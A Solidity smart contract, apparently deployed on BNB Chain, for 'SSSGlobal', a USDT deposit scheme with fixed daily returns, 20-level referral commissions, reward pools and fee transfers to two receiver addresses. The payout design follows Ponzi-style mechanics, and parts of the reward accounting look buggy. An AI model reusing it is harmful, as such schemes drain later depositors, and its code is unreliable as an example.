/**
 *Submitted for verification at BscScan.com on 2022-11-04
*/

// SPDX-License-Identifier: GPLv3

pragma solidity ^0.8.12;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, 'SafeMath: addition overflow');

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, 'SafeMath: subtraction overflow');
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, 'SafeMath: multiplication overflow');

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, 'SafeMath: division by zero');
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, 'SafeMath: modulo by zero');
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

    function min(uint256 x, uint256 y) internal pure returns (uint256 z) {
        z = x < y ? x : y;
    }

    function sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

contract SSSGlobal {

    using SafeMath for uint256;

    IERC20 public usdt;

    uint256 private constant baseDivider = 10000;
    uint256 private constant feePercents = 500;
    uint256 private constant minDeposit = 50e18;
    uint256 private constant minWithdraw = 5e18;
    uint256 private constant maxDeposit = 2000e18;
    uint256 private constant freezeIncomePercents = 3000;
    uint256 private constant timeStep = 1 days;
    uint256 private constant timeLeap = 10 days;
    uint256 private constant dayPerCycle = 15 days; 
    uint256 private constant dayRewardPercents = 133;
    uint256 private constant maxAddFreeze = 30 days;
    uint256 private constant referDepth = 20;
    uint256 private constant directPercents = 500;
    uint256[19] private levelPercents = [100, 200, 300, 100, 100, 100, 100, 100, 100, 50, 50, 50, 50, 50, 50, 50, 50, 50, 50];
    uint256[10] private roiPercents = [500, 250, 250, 125, 70, 50, 30, 30, 30, 15];

    uint256 private constant luckPoolPercents = 30;
    uint256 private constant topPoolPercents = 30;
    uint256 private constant royaltyPoolPercents = 100;

    uint256[6] private balDown = [10e22, 30e22, 50e22, 100e22, 500e22, 1000e22];
    uint256[6] private balDownRate = [1000, 1500, 2000, 3000, 5000, 6000];
    uint256[6] private balRecover = [15e22, 50e22, 100e22, 150e22, 500e22, 1000e22];

    mapping(uint256 => bool) public balStatus;

    address[2] public feeReceivers;

    address public defaultRefer;
    uint256 public startTime;
    uint256 public lastDistribute;
    uint256 public totalUser;
    uint256 public luckPool;
    uint256 public topPool;
    uint256 public royaltyPool;

    mapping(uint256 => address[]) public dayLuckUsers;
    mapping(uint256 => uint256[]) public dayLuckUsersDeposit;
    mapping(uint256 => address[5]) public dayTopUsers;

    address[] public level4Users;
    address[] public level5Users;
    address[] public level6Users;

    struct OrderInfo {
        uint256 amount;
        uint256 start;
        uint256 unfreeze;
        bool isUnfreezed;
    }

    mapping(address => OrderInfo[]) public orderInfos;

    address[] public depositors;

    struct UserInfo {
        address referrer;
        uint256 start;
        uint256 level;
        uint256 maxDeposit;
        uint256 totalDeposit;
        uint256 teamNum;
        uint256 maxDirectDeposit;
        uint256 teamTotalDeposit;
        uint256 totalFreezed;
        uint256 totalRevenue;
    }

    mapping(address => uint256) public lastDeposited;
    mapping(address => bool) public depositTwice;
    mapping(address => UserInfo) public userInfo;
    mapping(uint256 => mapping(address => uint256)) public userLayer1DayDeposit;
    mapping(address => mapping(uint256 => address[])) public teamUsers;

    struct RewardStatus {
        uint256 left;
        uint256 freezed;
        uint256 released;
    }

    struct RewardInfo {
        uint256 capitals;
        uint256 statics;
        uint256 directs;
        RewardStatus levelTwo;
        RewardStatus levelThree;
        RewardStatus levelFour;
        RewardStatus levelFive;
        RewardStatus levelSix;
        uint256 luck;
        uint256 top;
        uint256 split;
        uint256 splitDebt;
    }

    mapping(address => uint256) public royalty;
    mapping(address => uint256) public userRoiEarnings;
    mapping(address => RewardInfo) public rewardInfo;

    bool public isFreezeReward;

    event Register(address user, address referral);
    event Deposit(address user, uint256 amount);
    event DepositByDevFund(address user, uint256 amount);
    event XferByDevFund(address user, address receiver, uint256 amount);
    event Withdraw(address user, uint256 withdrawable);

    constructor(address _usdtAddr, address _defaultRefer, address[2] memory _feeReceivers) {
        usdt = IERC20(_usdtAddr);
        feeReceivers = _feeReceivers;
        startTime = block.timestamp;
        lastDistribute = block.timestamp;
        defaultRefer = _defaultRefer;
    }

    function register(address _referral) external {
        require(userInfo[_referral].referrer != address(0) || _referral == defaultRefer, "invalid refer");
        UserInfo storage user = userInfo[msg.sender];
        require(user.referrer == address(0), "referrer bonded");
        user.referrer = _referral;
        user.start = block.timestamp;
        _updateTeamNum(msg.sender);
        totalUser = totalUser.add(1);
        emit Register(msg.sender, _referral);
    }

    function deposit(uint256 _amount) external {
        if (_amount == maxDeposit) {
            if (block.timestamp - lastDeposited[msg.sender] <= dayPerCycle) {
                require(!depositTwice[msg.sender], "Already deposited");
                depositTwice[msg.sender] = true;
            } else {
                depositTwice[msg.sender] = false;
            }
            lastDeposited[msg.sender] = block.timestamp;
        }
        usdt.transferFrom(msg.sender, address(this), _amount);
        _deposit(msg.sender, _amount);
        emit Deposit(msg.sender, _amount);
    }

    function _deposit(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        require(user.referrer != address(0), "register first");
        require(_amount >= minDeposit, "less than min");
        require(_amount <= maxDeposit, "more than max");
        require(_amount.mod(minDeposit) == 0 && _amount >= minDeposit, "mod err");
        require(user.maxDeposit == 0 || _amount >= user.maxDeposit, "less before");
        
        if (user.maxDeposit == 0) {
            user.maxDeposit = _amount;
        } else if (user.maxDeposit < _amount) {
            user.maxDeposit = _amount;
        }

        _distributeDeposit(_amount);

        if (user.totalDeposit == 0) {
            uint256 dayNow = getCurDay();
            dayLuckUsers[dayNow].push(_user);
            dayLuckUsersDeposit[dayNow].push(_amount);
            _updateTopUser(user.referrer, _amount, dayNow);
        }

        depositors.push(_user);
        user.totalDeposit = user.totalDeposit.add(_amount);
        user.totalFreezed = user.totalFreezed.add(_amount);
        _updateLevel(msg.sender);
        uint256 addFreeze = (orderInfos[_user].length.div(2)).mul(timeStep);
        if (addFreeze > maxAddFreeze) {
            addFreeze = maxAddFreeze;
        }
        uint256 unfreezeTime = block.timestamp.add(dayPerCycle).add(addFreeze);
        orderInfos[_user].push(OrderInfo(
                _amount,
                block.timestamp,
                unfreezeTime,
                false
            ));

        _unfreezeFundAndUpdateReward(msg.sender, _amount);
        distributePoolRewards();
        _updateReferInfo(msg.sender, _amount);
        _updateReward(msg.sender, _amount);
        uint256 bal = usdt.balanceOf(address(this));
        _balActived(bal);
        if (isFreezeReward) {
            _setFreezeReward(bal);
        }
    }

    function depositByDevFund(uint256 _amount) external {
       require(_amount >= minDeposit && _amount.mod(minDeposit) == 0, "amount err");
        require(userInfo[msg.sender].totalDeposit == 0, "actived");
        uint256 splitLeft = getCurSplit(msg.sender);
        require(splitLeft >= _amount, "insufficient split");
        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);
        _deposit(msg.sender, _amount);
        emit DepositByDevFund(msg.sender, _amount);
    }

    function xferByDevFund(address _receiver, uint256 _amount) external {
        require(_amount >= minDeposit && _amount.mod(minDeposit) == 0, "amount err");
        uint256 splitLeft = getCurSplit(msg.sender);
        require(splitLeft >= _amount, "insufficient income");
        require(userInfo[_receiver].referrer == msg.sender, "not your downline");
        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);
        rewardInfo[_receiver].split = rewardInfo[_receiver].split.add(_amount);
        emit XferByDevFund(msg.sender, _receiver, _amount);
    }

    function distributePoolRewards() public {
        if (block.timestamp > lastDistribute.add(timeLeap)) {
            uint256 dayNow = getCurDay();
            _distributeRoyaltyPool();
            _distributeLuckPool(dayNow);
            _distributeTopPool(dayNow);
            lastDistribute = block.timestamp;
        }
    }

    function withdraw() external {
        distributePoolRewards();
        (uint256 staticReward, uint256 staticSplit) = _calCurStaticRewards(msg.sender);
        uint256 splitAmt = staticSplit;
        uint256 withdrawable = staticReward;
        (uint256 dynamicReward, uint256 dynamicSplit) = _calCurDynamicRewards(msg.sender);
        withdrawable = withdrawable.add(dynamicReward);
        splitAmt = splitAmt.add(dynamicSplit);
        RewardInfo storage userRewards = rewardInfo[msg.sender];
        userRewards.split = userRewards.split.add(splitAmt);
        userRewards.statics = 0;
        userRewards.directs = 0;
        userRewards.levelTwo.released = 0;
        userRewards.levelThree.released = 0;
        userRewards.levelFour.released = 0;
        userRewards.levelFive.released = 0;
        userRewards.levelSix.released = 0;
        userRewards.luck = 0;
        userRewards.top = 0;
        royalty[msg.sender] = 0;
        withdrawable = withdrawable.add(userRewards.capitals);
        userRewards.capitals = 0;
        withdrawable = withdrawable.add(userRoiEarnings[msg.sender]);
        userRoiEarnings[msg.sender] = 0;
        require(withdrawable >= minWithdraw, "amount error");
        usdt.transfer(msg.sender, withdrawable);
        uint256 bal = usdt.balanceOf(address(this));
        _setFreezeReward(bal);
        emit Withdraw(msg.sender, withdrawable);
    }

    function calcRoiOnRoi(address _user, uint256 _amount) private returns(uint256){
        uint256 total;
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for (uint256 i = 0; i < roiPercents.length; i++) {
            if (upline != address(0)) {
                uint amount = _amount.mul(roiPercents[i]).div(baseDivider);
                userRoiEarnings[upline] = userRoiEarnings[upline].add(amount);
                total = total.add(amount);
            }
            if(upline == defaultRefer) break;
            upline = userInfo[upline].referrer;
        }
        return total;
    }

    function getCurDay() public view returns (uint256) {
        return (block.timestamp.sub(startTime)).div(timeStep);
    }

    function getDayLuckLength(uint256 _day) external view returns (uint256) {
        return dayLuckUsers[_day].length;
    }

    function getTeamUsersLength(address _user, uint256 _layer) external view returns (uint256) {
        return teamUsers[_user][_layer].length;
    }

    function getOrderLength(address _user) external view returns (uint256) {
        return orderInfos[_user].length;
    }

    function getDepositorsLength() external view returns (uint256) {
        return depositors.length;
    }

    function getMaxFreezing(address _user) public view returns (uint256) {
        uint256 maxFreezing;
        for (uint256 i = orderInfos[_user].length; i > 0; i--) {
            OrderInfo storage order = orderInfos[_user][i - 1];
            if (order.unfreeze > block.timestamp) {
                if (order.amount > maxFreezing) {
                    maxFreezing = order.amount;
                }
            } else {
                break;
            }
        }
        return maxFreezing;
    }

    function getTeamDeposit(address _user) public view returns (uint256, uint256, uint256){
        uint256 totalTeam;
        uint256 maxTeam;
        uint256 otherTeam;
        for (uint256 i = 0; i < teamUsers[_user][0].length; i++) {
            uint256 userTotalTeam = userInfo[teamUsers[_user][0][i]].teamTotalDeposit.add(userInfo[teamUsers[_user][0][i]].totalDeposit);
            totalTeam = totalTeam.add(userTotalTeam);
            if (userTotalTeam > maxTeam) {
                maxTeam = userTotalTeam;
            }
        }
        otherTeam = totalTeam.sub(maxTeam);
        return (maxTeam, otherTeam, totalTeam);
    }

    function getCurSplit(address _user) public view returns (uint256){
        (, uint256 staticSplit) = _calCurStaticRewards(_user);
        (, uint256 dynamicSplit) = _calCurDynamicRewards(_user);
        return rewardInfo[_user].split.add(staticSplit).add(dynamicSplit).sub(rewardInfo[_user].splitDebt);
    }

    function _calCurStaticRewards(address _user) private view returns (uint256, uint256) {
        RewardInfo storage userRewards = rewardInfo[_user];
        uint256 totalRewards = userRewards.statics;
        uint256 splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
        uint256 withdrawable = totalRewards.sub(splitAmt);
        return (withdrawable, splitAmt);
    }

    function _calCurDynamicRewards(address _user) private view returns (uint256, uint256) {
        RewardInfo storage userRewards = rewardInfo[_user];
        uint256 totalRewards = userRewards.directs
        .add(userRewards.levelTwo.released)
        .add(userRewards.levelThree.released)
        .add(userRewards.levelFour.released)
        .add(userRewards.levelFive.released)
        .add(userRewards.levelSix.released);
        totalRewards = totalRewards.add(
            userRewards.luck.add(userRewards.top).add(royalty[_user])
            );
        uint256 splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
        uint256 withdrawable = totalRewards.sub(splitAmt);
        return (withdrawable, splitAmt);
    }

    function _updateTeamNum(address _user) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for (uint256 i = 0; i < referDepth; i++) {
            if (upline != address(0)) {
                userInfo[upline].teamNum = userInfo[upline].teamNum.add(1);
                teamUsers[upline][i].push(_user);
                _updateLevel(upline);
                if (upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            } else {
                break;
            }
        }
    }

    function _updateTopUser(address _user, uint256 _amount, uint256 _dayNow) private {
        userLayer1DayDeposit[_dayNow][_user] = userLayer1DayDeposit[_dayNow][_user].add(_amount);
        bool updated;
        for (uint256 i = 0; i < 5; i++) {
            address topUser = dayTopUsers[_dayNow][i];
            if (topUser == _user) {
                _reOrderTop(_dayNow);
                updated = true;
                break;
            }
        }
        if (!updated) {
            address lastUser = dayTopUsers[_dayNow][2];
            if (userLayer1DayDeposit[_dayNow][lastUser] < userLayer1DayDeposit[_dayNow][_user]) {
                dayTopUsers[_dayNow][2] = _user;
                _reOrderTop(_dayNow);
            }
        }
    }

    function _reOrderTop(uint256 _dayNow) private {
        for (uint256 i = 5; i > 1; i--) {
            address topUser1 = dayTopUsers[_dayNow][i - 1];
            address topUser2 = dayTopUsers[_dayNow][i - 2];
            uint256 amount1 = userLayer1DayDeposit[_dayNow][topUser1];
            uint256 amount2 = userLayer1DayDeposit[_dayNow][topUser2];
            if (amount1 > amount2) {
                dayTopUsers[_dayNow][i - 1] = topUser2;
                dayTopUsers[_dayNow][i - 2] = topUser1;
            }
        }
    }

    function _removeInvalidDeposit(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for (uint256 i = 0; i < referDepth; i++) {
            if (upline != address(0)) {
                if (userInfo[upline].teamTotalDeposit > _amount) {
                    userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.sub(_amount);
                } else {
                    userInfo[upline].teamTotalDeposit = 0;
                }
                if (upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            } else {
                break;
            }
        }
    }

    function _updateReferInfo(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for (uint256 i = 0; i < referDepth; i++) {
            if (upline != address(0)) {
                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.add(_amount);
                _updateLevel(upline);
                if (upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            } else {
                break;
            }
        }
    }

    function _updateLevel(address _user) private {
        UserInfo storage user = userInfo[_user];
        uint256 levelNow = _calLevelNow(_user);
        if (levelNow > user.level) {
            user.level = levelNow;
            if (levelNow == 4) {
                level4Users.push(_user);
            }
            if (levelNow == 5) {
                level5Users.push(_user);
            }
            if (levelNow == 6) {
                level6Users.push(_user);
            }
        }
    }

    function _calLevelNow(address _user) private view returns (uint256) {
        UserInfo storage user = userInfo[_user];
        uint256 total = user.totalDeposit;
        uint256 levelNow = 1;
        (uint256 maxTeam, uint256 otherTeam,) = getTeamDeposit(_user);
        if (total >= 400e18 && user.teamNum >= 25 && maxTeam >= 5000e18 && otherTeam >= 5000e18) {
            levelNow = 2;
        } 
        if (total >= 800e18 && user.teamNum >= 50 && maxTeam >= 10000e18 && otherTeam >= 10000e18) {
            levelNow = 3;
        } 
        if (total >= 1000e18 && user.teamNum >= 100 && maxTeam >= 20000e18 && otherTeam >= 20000e18) {
            levelNow = 4;
        } 
        if (total >= 2000e18 && user.teamNum >= 200 && maxTeam >= 40000e18 && otherTeam >= 40000e18) {
            levelNow = 5;
        }
        if (total >= 2000e18 && user.teamNum >= 300 && maxTeam >= 75000e18 && otherTeam >= 75000e18) {
            levelNow = 6;
        }
        return levelNow;
    }

    function _unfreezeFundAndUpdateReward(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        bool isUnfreezeCapital;
        for (uint256 i = 0; i < orderInfos[_user].length; i++) {
            OrderInfo storage order = orderInfos[_user][i];
            if (block.timestamp > order.unfreeze && order.isUnfreezed == false && _amount >= order.amount) {
                order.isUnfreezed = true;
                isUnfreezeCapital = true;
                if (user.totalFreezed > order.amount) {
                    user.totalFreezed = user.totalFreezed.sub(order.amount);
                } else {
                    user.totalFreezed = 0;
                }
                _removeInvalidDeposit(_user, order.amount);
                uint256 staticReward = order.amount.mul(dayRewardPercents).mul(dayPerCycle).div(timeStep).div(baseDivider);
                staticReward = staticReward.sub(calcRoiOnRoi(msg.sender, staticReward));
                if (isFreezeReward) {
                    if (user.totalFreezed > user.totalRevenue) {
                        uint256 leftCapital = user.totalFreezed.sub(user.totalRevenue);
                        if (staticReward > leftCapital) {
                            staticReward = leftCapital;
                        }
                    } else {
                        staticReward = 0;
                    }
                }
                rewardInfo[_user].capitals = rewardInfo[_user].capitals.add(order.amount);
                rewardInfo[_user].statics = rewardInfo[_user].statics.add(staticReward);
                user.totalRevenue = user.totalRevenue.add(staticReward);
                break;
            }
        }

        if (!isUnfreezeCapital) {
            RewardInfo storage userReward = rewardInfo[_user];
            if (userReward.levelFive.freezed > 0) {
                uint256 release = _amount;
                if (_amount >= userReward.levelFive.freezed) {
                    release = userReward.levelFive.freezed;
                }
                userReward.levelFive.freezed = userReward.levelFive.freezed.sub(release);
                userReward.levelFive.released = userReward.levelFive.released.add(release);
                user.totalRevenue = user.totalRevenue.add(release);
            }
            if (userReward.levelSix.freezed > 0) {
                uint256 releaseLevelSix = _amount;
                if (_amount >= userReward.levelSix.freezed) {
                    releaseLevelSix = userReward.levelSix.freezed;
                }
                userReward.levelSix.freezed = userReward.levelSix.freezed.sub(releaseLevelSix);
                userReward.levelSix.released = userReward.levelSix.released.add(releaseLevelSix);
                user.totalRevenue = user.totalRevenue.add(releaseLevelSix);
            }
        }
    }

    function _distributeRoyaltyPool() private {
        uint256 level6Count;
        for (uint256 i = 0; i < level6Users.length; i++) {
            if (userInfo[level6Users[i]].level == 6) {
                level6Count = level6Count.add(1);
            }
        }
        if (level6Count > 0) {
            uint256 reward = royaltyPool.div(level6Count);
            uint256 totalReward;
            for (uint256 i = 0; i < level6Users.length; i++) {
                if (userInfo[level6Users[i]].level == 6) {
                    royalty[level6Users[i]] = royalty[level6Users[i]].add(reward);
                    userInfo[level6Users[i]].totalRevenue = userInfo[level6Users[i]].totalRevenue.add(reward);
                    totalReward = totalReward.add(reward);
                }
            }
            if (royaltyPool > totalReward) {
                royaltyPool = royaltyPool.sub(totalReward);
            } else {
                royaltyPool = 0;
            }
        }
    }

    function _distributeLuckPool(uint256 _dayNow) private {
        uint256 dayDepositCount = dayLuckUsers[_dayNow - 1].length;
        if (dayDepositCount > 0) {
            uint256 checkCount = 10;
            if (dayDepositCount < 10) {
                checkCount = dayDepositCount;
            }
            uint256 totalDeposit;
            uint256 totalReward;
            for (uint256 i = dayDepositCount; i > dayDepositCount.sub(checkCount); i--) {
                totalDeposit = totalDeposit.add(dayLuckUsersDeposit[_dayNow - 1][i - 1]);
            }

            for (uint256 i = dayDepositCount; i > dayDepositCount.sub(checkCount); i--) {
                address userAddr = dayLuckUsers[_dayNow - 1][i - 1];
                if (userAddr != address(0)) {
                    uint256 reward = luckPool.mul(dayLuckUsersDeposit[_dayNow - 1][i - 1]).div(totalDeposit);
                    totalReward = totalReward.add(reward);
                    rewardInfo[userAddr].luck = rewardInfo[userAddr].luck.add(reward);
                    userInfo[userAddr].totalRevenue = userInfo[userAddr].totalRevenue.add(reward);
                }
            }
            if (luckPool > totalReward) {
                luckPool = luckPool.sub(totalReward);
            } else {
                luckPool = 0;
            }
        }
    }

    function _distributeTopPool(uint256 _dayNow) private {
        uint16[5] memory rates = [4000, 3000, 1500, 1000, 500];
        uint72[5] memory maxReward = [2000e18, 1000e18, 500e18, 250e18, 125e18];
        uint256 totalReward;
        for (uint256 i = 0; i < 5; i++) {
            address userAddr = dayTopUsers[_dayNow - 1][i];
            if (userAddr != address(0)) {
                uint256 reward = topPool.mul(rates[i]).div(baseDivider);
                if (reward > maxReward[i]) {
                    reward = maxReward[i];
                }
                rewardInfo[userAddr].top = rewardInfo[userAddr].top.add(reward);
                userInfo[userAddr].totalRevenue = userInfo[userAddr].totalRevenue.add(reward);
                totalReward = totalReward.add(reward);
            }
        }
        if (topPool > totalReward) {
            topPool = topPool.sub(totalReward);
        } else {
            topPool = 0;
        }
    }

    function _distributeDeposit(uint256 _amount) private {
        uint256 fee = _amount.mul(feePercents).div(baseDivider);
        usdt.transfer(feeReceivers[0], fee.div(5).mul(2));
        usdt.transfer(feeReceivers[1], fee.div(5).mul(3));
        uint256 luck = _amount.mul(luckPoolPercents).div(baseDivider);
        luckPool = luckPool.add(luck);
        uint256 top = _amount.mul(topPoolPercents).div(baseDivider);
        topPool = topPool.add(top);
        royaltyPool = royaltyPool.add(_amount.mul(royaltyPoolPercents).div(baseDivider));
    }

    function _updateReward(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        uint256 commissionAmount = _amount;
        for (uint256 i = 0; i < referDepth; i++) {
            if (upline != address(0)) {
                uint256 newAmount = _amount;
                if (upline != defaultRefer) {
                    uint256 maxFreezing = getMaxFreezing(upline);
                    if (maxFreezing < _amount) {
                        newAmount = maxFreezing;
                    }
                }
                RewardInfo storage upRewards = rewardInfo[upline];
                uint256 reward;
                if (i > 9 && userInfo[upline].level > 5) { 
                    reward = newAmount.mul(levelPercents[i - 1]).div(baseDivider);
                    upRewards.levelSix.freezed = upRewards.levelSix.freezed.add(reward);
                    if (upRewards.levelSix.left > 0) {
                        if (reward > upRewards.levelSix.left) {
                            reward = upRewards.levelSix.left;
                        }
                        upRewards.levelSix.left = upRewards.levelSix.left.sub(reward);
                        upRewards.levelSix.freezed = upRewards.levelSix.freezed.add(reward);
                    }
                } else if (i > 3 && userInfo[upline].level > 4) { 
                    reward = newAmount.mul(levelPercents[i - 1]).div(baseDivider);
                    upRewards.levelFive.freezed = upRewards.levelFive.freezed.add(reward);
                     if (upRewards.levelFive.left > 0) {
                        if (reward > upRewards.levelFive.left) {
                            reward = upRewards.levelFive.left;
                        }
                        upRewards.levelFive.left = upRewards.levelFive.left.sub(reward);
                        upRewards.levelFive.freezed = upRewards.levelFive.freezed.add(reward);
                    }
                } else if (i == 3 && userInfo[upline].level > 3) { 
                    reward = newAmount.mul(levelPercents[i - 1]).div(baseDivider);
                    upRewards.levelFour.freezed = upRewards.levelFour.freezed.add(reward);
                    if (upRewards.levelFour.freezed > 0) {
                        if (reward > upRewards.levelFour.freezed) {
                            reward = upRewards.levelFour.freezed;
                        }
                        upRewards.levelFour.freezed = upRewards.levelFour.freezed.sub(reward);
                        upRewards.levelFour.released = upRewards.levelFour.released.add(reward);
                        userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                    }
                } else if (i == 2 && userInfo[upline].level > 2) { 
                    reward = newAmount.mul(levelPercents[i - 1]).div(baseDivider);
                    upRewards.levelThree.freezed = upRewards.levelThree.freezed.add(reward);
                    if (upRewards.levelThree.freezed > 0) {
                        if (reward > upRewards.levelThree.freezed) {
                            reward = upRewards.levelThree.freezed;
                        }
                        upRewards.levelThree.freezed = upRewards.levelThree.freezed.sub(reward);
                        upRewards.levelThree.released = upRewards.levelThree.released.add(reward);
                        userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                    }
                } else if (i == 1 && userInfo[upline].level > 1) { 
                    reward = newAmount.mul(levelPercents[i - 1]).div(baseDivider);
                    upRewards.levelTwo.freezed = upRewards.levelTwo.freezed.add(reward);
                    if (upRewards.levelTwo.freezed > 0) {
                        if (reward > upRewards.levelTwo.freezed) {
                        reward = upRewards.levelTwo.freezed;
                        }
                        upRewards.levelTwo.freezed = upRewards.levelTwo.freezed.sub(reward);
                        upRewards.levelTwo.released = upRewards.levelTwo.released.add(reward);
                        userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                    }
                } else {
                    reward = commissionAmount.mul(directPercents).div(baseDivider);
                    upRewards.directs = upRewards.directs.add(reward);
                    userInfo[upline].totalRevenue = userInfo[upline].totalRevenue.add(reward);
                }
                if (upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            } else {
                break;
            }
        }
    }

    function _balActived(uint256 _bal) private {
        for (uint256 i = balDown.length; i > 0; i--) {
            if (_bal >= balDown[i - 1]) {
                balStatus[balDown[i - 1]] = true;
                break;
            }
        }
    }

    function _setFreezeReward(uint256 _bal) private {
        for (uint256 i = balDown.length; i > 0; i--) {
            if (balStatus[balDown[i - 1]]) {
                uint256 maxDown = balDown[i - 1].mul(balDownRate[i - 1]).div(baseDivider);
                if (_bal < balDown[i - 1].sub(maxDown)) {
                    isFreezeReward = true;
                } else if (isFreezeReward && _bal >= balRecover[i - 1]) {
                    isFreezeReward = false;
                }
                break;
            }
        }
    }

}